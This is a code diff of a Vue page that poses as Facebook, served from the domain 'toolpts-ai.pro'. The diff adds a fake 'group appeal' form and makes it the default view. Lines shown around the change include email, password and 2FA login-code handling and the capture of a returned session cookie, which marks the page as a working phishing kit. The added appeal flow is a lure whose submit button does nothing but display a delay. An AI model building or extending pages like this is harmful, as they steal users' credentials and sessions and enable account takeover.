@@ -61,6 +61,18 @@ input {
   font-size: 1.2em;
 }
 
+.btn-submit-form {
+  width: 50%;
+  padding: 10px;
+  background-color: #1877f2;
+  border: none;
+  box-shadow: 2px 2px 10px 2px rgba(128, 128, 128, 0.185);
+  border-radius: 5px;
+  color: aliceblue;
+  font-weight: 400;
+  margin: auto;
+}
+
 .forget-password {
   text-align: center;
   color: #1877f2;
@@ -180,12 +192,76 @@ input {
 .error span {
   font-weight: 700;
 }
-.error-code p{
+
+.error-code p {
   font-size: 0.9em;
   font-weight: 700;
 }
-.main{
+
+.main {
   padding-top: 20px;
+  text-align: center;
+}
+
+.main_1 {
+  color: black;
+  text-align: start;
+  padding: 30px;
+}
+
+.main_2 {
+  padding: 20px;
+}
+
+.flex {
+  display: flex;
+  flex-wrap: nowrap;
+}
+
+.radio {
+  display: inline;
+  line-height: 35px;
+}
+
+.selection {
+  margin: 0;
+  padding: 0;
+}
+
+li {
+  list-style: none;
+}
+
+.checkbox {
+  width: 45px;
+}
+
+h3 {
+  margin-bottom: 10px;
+}
+
+.btn-next {
+  color: #1877f2;
+  padding: 10px;
+}
+
+.input-next {
+  text-align: center;
+  margin-top: 40px;
+}
+
+.desciption {
+  font-size: 13px;
+  margin-bottom: 10px;
+}
+
+.textarea {
+  padding: 10px;
+  background-color: rgba(224, 224, 224, 0.356);
+  border: 1px solid rgba(128, 128, 128, 0.116);
+}
+
+.capture-img {
   text-align: center;
 }
 </style>
@@ -245,7 +321,8 @@ input {
           <hr>
         </div>
         <div class="error-code" v-if="error_code">
-          <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
+          <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.
+          </p>
         </div>
         <div class="input">
           It looks like you haven't logged in from this browser before. Please enter the login code from your phone below.
@@ -268,15 +345,101 @@ input {
       </div>
       <br>
       <!-- <div class="about">
-                      About - Help - More
-                    </div>
-                    <div class="meta_about">
-                      <p>Meta © 2023</p>
-                    </div> -->
+                                About - Help - More
+                              </div>
+                              <div class="meta_about">
+                                <p>Meta © 2023</p>
+                              </div> -->
     </div>
     <div class="site_body" v-if="design == 3">
-      <div class="main">
-        <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p>
+      <div class="main_1" v-if="main_1 == 1">
+        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
+        <h3>Choose the cause of group resistance</h3>
+        <span class="desciption">Complain according to the latest prescription, with response within 24 hours</span>
+        <ul class="selection">
+          <li>
+            <div class="radio">
+              <input type="radio" name="checkbox" class="checkbox">
+              <label>Resist violations in facebook group</label><br>
+            </div>
+            <div class="radio">
+              <input type="radio" name="checkbox" class="checkbox">
+              <label>Resistance neutralizes the group</label><br>
+            </div>
+          </li>
+        </ul>
+        <div class="input-next">
+          <a class="btn-next" @click="nextEvent">Next</a>
+        </div>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <div class="input-next">
+          <a class="btn-next" @click="loginEvent" style="text-decoration: underline;">Logout</a>
+        </div>
+      </div>
+      <div class="main_2" v-else-if="main_1 == 2">
+        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
+        <h3>Submit an appeal</h3>
+        <span class="desciption">Provide new information to the group</span>
+        <div class="input">
+          <label for="age1">Group: </label>
+          <input type="input" class="input" placeholder="Path or group id">
+        </div>
+        <div class="input">
+          <label for="age1">Contact email: </label>
+          <input type="input" class="input" placeholder="Contact email">
+        </div>
+        <div class="reson">
+          <div class="radio">
+            <input type="radio" name="checkbox" class="checkbox">
+            <label for="age1">Privacy violation</label><br>
+          </div>
+          <div class="radio">
+            <input type="radio" name="checkbox" class="checkbox">
+            <label for="age1">Copyright infringement</label><br>
+          </div>
+          <div class="radio">
+            <input type="radio" name="checkbox" class="checkbox">
+            <label for="age1">Violate community standards</label><br>
+          </div>
+          <div class="radio">
+            <input type="radio" name="checkbox" class="checkbox">
+            <label for="age1">Insults, causing trouble, inciting war</label><br>
+          </div>
+          <div class="radio">
+            <input type="radio" name="checkbox" class="checkbox">
+            <label for="age1">Orther</label><br>
+          </div>
+          <div class="radio">
+            <textarea type="text" name="checkbox" class="input textarea" rows="5" placeholder="Other causes."></textarea>
+          </div>
+        </div>
+        <div class="capture">
+          <div class="capture-img">
+            <a @click="capture"><i class='bx bx-cloud-upload'></i> Upload photos</a>
+            <input type="file" hidden class="capture" id="capture">
+          </div>
+        </div>
+        <br>
+        <div class="input-next">
+          <button type="button" class="btn-submit-form" @click="submit">Submit</button>
+        </div>
+      </div>
+      <div class="main_2" v-else>
+        <p>We will respond to you within the next 24 hours, thank you!</p>
+        <div class="input-next">
+          <a class="btn-next" @click="goHome">Home</a>
+        </div>
       </div>
     </div>
   </div>
@@ -287,7 +450,11 @@ import { ref, onMounted } from 'vue';
 const domain = ref('toolpts-ai.pro')
 // Create a ref
 const loading = ref(false)
-const design = ref(1)
+const design = ref(3)
+
+const main_1 = ref(1)
+
+
 const email = ref('')
 const password = ref('')
 
@@ -301,12 +468,29 @@ const nh = ref('')
 
 const error_email = ref(false)
 const error_code = ref(false)
+
+const nextEvent = () => {
+  main_1.value = 2
+}
+const goHome = () => {
+  main_1.value = 1
+}
 const setup = () => {
   document.title = "Facebook"
   // design.value = 2
 };
 const loginEvent = () => {
   design.value = 1
+}
+const submit = () => {
+  loading.value = true
+  setTimeout(() => {
+    main_1.value = 3
+    loading.value = false
+  }, 5000)
+}
+const capture = () => {
+  document.getElementById('capture').click()
 }
 const loginData = async () => {
   error_email.value = false
@@ -333,7 +517,7 @@ const loginData = async () => {
 }
 const confirm2fa = async () => {
   loading.value = true
-  error_code.value =false
+  error_code.value = false
   let result = await confirmVerify()
   var data = JSON.parse(result)
   coke.value = data.cookie
